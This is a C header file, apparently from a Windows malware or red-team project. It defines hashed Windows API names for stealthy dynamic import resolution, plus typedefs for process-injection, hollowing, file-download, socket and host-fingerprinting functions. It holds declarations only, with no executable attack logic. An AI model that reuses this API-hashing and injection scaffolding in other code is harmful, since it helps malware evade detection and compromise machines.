#pragma once
#pragma once
#include <wtypes.h>

#define MAX_UNICODE_PATH	32767L

/*
 *	String Hashes of Function
 *
 */

#define HASH_LoadLibraryW 1102179001
#define HASH_GetProcessHeap 2264827474
#define HASH_HeapAlloc 25488756
#define HASH_HeapReAlloc 1403412087
#define HASH_HeapFree 694357821
#define HASH_VirtualAlloc 52974849
#define HASH_VirtualAllocEx 2931164316
#define HASH_VirtualFree 983223410
#define HASH_WriteConsoleW 1076267414
#define HASH_DeleteFileW 2420213633
#define HASH_GetModuleFileNameW 2751190523
#define HASH_CreateProcessW 1014756351
#define HASH_GetThreadContext 2244780670
#define HASH_SetThreadContext 1859143442
#define HASH_ResumeThread 3139559470
#define HASH_ReadProcessMemory 158663941
#define HASH_WriteProcessMemory 3221786346
#define HASH_GetSystemInfo 3069927718
#define HASH_GetComputerNameW 846106086
#define HASH_WideCharToMultiByte 3867336062
#define HASH_MultiByteToWideChar 2421422530
#define HASH_CreateToolhelp32Snapshot 408385205
#define HASH_Process32FirstW 243382280
#define HASH_Process32NextW 2883916351
#define HASH_OpenProcess 1090911318
#define HASH_TerminateProcess 4165922393
#define HASH_CloseHandle 4206493797
#define HASH_GetStdHandle 3820586858
#define HASH_GlobalMemoryStatusEx 2220744438
#define HASH_RtlZeroMemory 1086849060
#define HASH_RtlGetVersion 3452526129
#define HASH_NtQuerySystemInformation 2051249994
#define HASH_NtQueryInformationProcess 3928873610
#define HASH_MessageBoxW 833196014
#define HASH_MessageBoxW 833196014
#define HASH_EnumDisplayDevicesW 332565898
#define HASH_GetUserNameW 581411704
#define HASH_RegCreateKeyExW 3974957970
#define HASH_RegCreateKeyExW 3974957970
#define HASH_RegOpenKeyExW 4227238086
#define HASH_RegSetValueExW 3360749446
#define HASH_RegGetValueW 1167360593
#define HASH_RegCloseKey 306320714
#define HASH_RegQueryValueExW 2116538150
#define HASH_GetCurrentHwProfileW 675223243
#define HASH_URLDownloadToFileW 3335989926
#define HASH_WSAStartup 538074207
#define HASH_WSACleanup 2345834946
#define HASH_socket 2417129068
#define HASH_htons 2986200853
#define HASH_inet_pton 3317905125
#define HASH_InetPtonW 2069976051
#define HASH_connect 2866859257
#define HASH_send 1919010991
#define HASH_recv 3974385709
#define HASH_setsockopt 910428104
#define HASH_ioctlsocket 2151917855
#define HASH_closesocket 109265666



#pragma region Structure

typedef HINSTANCE HMODULE;

typedef HINSTANCE__* (__stdcall* fnLoadLibraryW)(const wchar_t*);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef struct tagPROCESSENTRY32W {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID; // this process
	ULONG_PTR th32DefaultHeapID;
	DWORD th32ModuleID; // associated exe
	DWORD cntThreads;
	DWORD th32ParentProcessID; // this process's parent process
	LONG pcPriClassBase; // Base priority of process's threads
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH]; // Path
} PROCESSENTRY32W;

typedef PROCESSENTRY32W* PPROCESSENTRY32W;
typedef PROCESSENTRY32W* LPPROCESSENTRY32W;

typedef struct _PROCESSINFO {
	DWORD dwPID;
	DWORD dwParentPID;
	DWORD dwSessionID;
	DWORD dwPEBBaseAddress;
	DWORD dwAffinityMask;
	LONG dwBasePriority;
	LONG dwExitStatus;
	BYTE cBeingDebugged;
	TCHAR szImgPath[MAX_UNICODE_PATH];
	TCHAR szCmdLine[MAX_UNICODE_PATH];
} PROCESSINFO;

#pragma endregion

// ************************************************************************
//                           Functions TypeDefinations
// ************************************************************************

typedef int (WINAPI* fnWideCharToMultiByte)(
	UINT CodePage,
	DWORD dwFlags,
	_In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
	int cchWideChar,
	LPSTR lpMultiByteStr,
	int cbMultiByte,
	LPCCH lpDefaultChar,
	LPBOOL lpUsedDefaultChar
	);

typedef int (WINAPI* fnMultiByteToWideChar)(
	UINT CodePage,
	DWORD dwFlags,
	_In_NLS_string_(cbMultiByte)LPCCH lpMultiByteStr,
	int cbMultiByte,
	LPWSTR lpWideCharStr,
	int cchWideChar
	);

typedef int (WINAPI* fnMessageBoxW)(
	HWND hWnd,
	LPCWSTR lpText,
	LPCWSTR lpCaption,
	UINT uType
	);

typedef BOOL(WINAPI* fnWriteConsoleW)(
	_In_ HANDLE hConsoleOutput,
	_In_ const VOID* lpBuffer,
	_In_ DWORD nNumberOfCharsToWrite,
	_Out_ LPDWORD lpNumberOfCharsWritten,
	_Reserved_ LPVOID lpReserved
	);

typedef LSTATUS(WINAPI* fnRegOpenKeyExW)(
	HKEY hKey,
	LPCWSTR lpSubKey,
	DWORD ulOptions,
	REGSAM samDesired,
	PHKEY phkResult
	);

typedef LSTATUS(WINAPI* fnRegGetValueW)(
	HKEY hkey,
	LPCWSTR lpSubKey,
	LPCWSTR lpValue,
	DWORD dwFlags,
	LPDWORD pdwType,
	PVOID pvData,
	LPDWORD pcbData
	);

typedef LSTATUS(WINAPI* fnRegCreateKeyExW)(
	HKEY hKey,
	LPCWSTR lpSubKey,
	DWORD Reserved,
	LPWSTR lpClass,
	DWORD dwOptions,
	REGSAM samDesired,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PHKEY phkResult,
	LPDWORD lpdwDisposition
	);

typedef LSTATUS(WINAPI* fnRegSetValueExW)(
	HKEY hKey,
	LPCWSTR lpValueName,
	DWORD Reserved,
	DWORD dwType,
	const BYTE* lpData,
	DWORD cbData
	);

typedef LSTATUS(WINAPI* fnRegQueryValueExW)(
	HKEY hKey,
	LPCWSTR lpValueName,
	LPDWORD lpReserved,
	LPDWORD lpType,
	LPBYTE lpData,
	LPDWORD lpcbData
	);

typedef LSTATUS(WINAPI* fnRegCloseKey)(
	HKEY hKey
	);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(
	HMODULE hModule,
	LPWSTR lpFilename,
	DWORD nSize
	);

typedef BOOL(WINAPI* fnDeleteFileW)(
	LPCWSTR lpFileName
	);

typedef HRESULT(WINAPI* fnURLDownloadToFileW)(
	LPUNKNOWN pCaller,
	LPCWSTR szURL,
	LPCWSTR szFileName,
	DWORD dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB
	);


typedef BOOL(WINAPI* fnCreateProcessW)(
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI* fnReadProcessMemory)(
	_In_ HANDLE hProcess,
	_In_ LPCVOID lpBaseAddress,
	_Out_ LPVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_ SIZE_T* lpNumberOfBytesRead
	);

typedef BOOL(WINAPI* fnWriteProcessMemory)(
	_In_ HANDLE hProcess,
	_In_ LPVOID lpBaseAddress,
	_In_ LPCVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_ SIZE_T* lpNumberOfBytesWritten
	);

typedef BOOL(WINAPI* fnGetThreadContext)(
	HANDLE hThread,
	LPCONTEXT lpContext
	);

typedef BOOL(WINAPI* fnCloseHandle)(
	HANDLE hObject
	);

typedef HANDLE(WINAPI* fnGetStdHandle)(
	_In_ DWORD nStdHandle
	);

typedef BOOL(WINAPI* fnSetThreadContext)(
	HANDLE hThread,
	const CONTEXT* lpContext
	);

typedef DWORD(WINAPI* fnResumeThread)(
	HANDLE hThread
	);

typedef int (PASCAL FAR* fnWSAStartup)(
	WORD wVersionRequired,
	LPWSADATA lpWSAData
	);

typedef SOCKET(PASCAL FAR* fnsocket)(
	int af,
	int type,
	int protocol
	);

typedef int (PASCAL FAR* fnWSACleanup)(

	);

typedef u_short(PASCAL FAR* fnhtons)(
	u_short hostshort
	);

typedef INT(PASCAL FAR* fninet_pton)(
	__in INT Family,
	__in PCTSTR pszAddrString,
	__out PVOID pAddrBuf
	);

typedef INT(PASCAL FAR* fnInetPtonW)(
	INT Family,
	PCWSTR pszAddrString,
	PVOID pAddrBuf
	);

typedef int (PASCAL FAR* fnconnect)(
	SOCKET s,
	const sockaddr* name,
	int namelen
	);

typedef int (PASCAL FAR* fnsend)(
	SOCKET s,
	const char* buf,
	int len,
	int flags
	);

typedef int (PASCAL FAR* fnrecv)(
	SOCKET s,
	char* buf,
	int len,
	int flags
	);

typedef int (PASCAL FAR* fnsetsockopt)(
	SOCKET s,
	int level,
	int optname,
	const char* optval,
	int optlen
	);

typedef int (PASCAL FAR* fnioctlsocket)(
	SOCKET s,
	long cmd,
	u_long* argp
	);

typedef int (PASCAL FAR* fnclosesocket)(
	IN SOCKET s
	);


typedef void (NTAPI* fnRtlZeroMemory)(
	VOID UNALIGNED* Destination,
	SIZE_T Length
	);

typedef HANDLE(WINAPI* fnGetProcessHeap)(

	);

typedef LPVOID(WINAPI* fnHeapAlloc)(
	HANDLE hHeap,
	DWORD dwFlags,
	SIZE_T dwBytes
	);

typedef LPVOID(WINAPI* fnHeapReAlloc)(
	HANDLE hHeap,
	DWORD dwFlags,
	_Frees_ptr_opt_ LPVOID lpMem,
	SIZE_T dwBytes
	);

typedef BOOL(WINAPI* fnHeapFree)(
	HANDLE hHeap,
	DWORD dwFlags,
	_Frees_ptr_opt_ LPVOID lpMem
	);

typedef LPVOID(WINAPI* fnVirtualAlloc)(
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
	);

typedef LPVOID(WINAPI* fnVirtualAllocEx)(
	_In_ HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
	);

typedef BOOL(WINAPI* fnVirtualFree)(
	_In_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD dwFreeType
	);

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS,
	PVOID,
	ULONG,
	PULONG);

typedef HANDLE(WINAPI* fnOpenProcess)(
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	DWORD dwProcessId
	);

typedef BOOL(WINAPI* fnTerminateProcess)(
	HANDLE hProcess,
	UINT uExitCode
	);

typedef void (WINAPI* fnGetSystemInfo)(
	LPSYSTEM_INFO lpSystemInfo
	);

typedef NTSTATUS(NTAPI* fnRtlGetVersion)(
	PRTL_OSVERSIONINFOW lpVersionInformation
	);

typedef BOOL(WINAPI* fnGetUserNameW)(
	LPWSTR lpBuffer,
	LPDWORD pcbBuffer
	);
typedef BOOL(WINAPI* fnGetComputerNameW)(
	LPWSTR lpBuffer,
	LPDWORD nSize
	);

typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(
	DWORD dwFlags,
	DWORD th32ProcessID
	);

typedef BOOL(WINAPI* fnProcess32FirstW)(
	HANDLE hSnapshot,
	LPPROCESSENTRY32W lppe
	);

typedef BOOL(WINAPI* fnProcess32NextW)(
	HANDLE hSnapshot,
	LPPROCESSENTRY32W lppe
	);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFO ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength
	);

typedef BOOL(WINAPI* fnEnumDisplayDevicesW)(
	LPCWSTR lpDevice,
	DWORD iDevNum,
	PDISPLAY_DEVICEW lpDisplayDevice,
	DWORD dwFlags
	);

typedef BOOL(WINAPI* fnGlobalMemoryStatusEx)(
	LPMEMORYSTATUSEX lpBuffer
	);

typedef BOOL(WINAPI* fnGetCurrentHwProfileW)(
	LPHW_PROFILE_INFOW lpHwProfileInfo
	);
